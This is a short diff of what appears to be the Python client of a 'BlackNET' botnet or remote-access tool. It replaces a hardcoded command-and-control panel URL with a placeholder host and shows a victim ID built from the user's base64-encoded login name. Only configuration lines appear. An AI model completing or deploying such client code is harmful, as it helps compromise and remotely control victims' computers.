@@ -6,7 +6,7 @@ import platform
 import base64
 import time
 
-PanelURL = "http://darksoftware.ml/blacknet/"
+PanelURL = "http://EnterYourBlackNETPanelHost/blacknet/"
 cid = "HacKed"
 uid = cid + "_" + base64.b64encode(os.getlogin());
 if os.name == "posix":
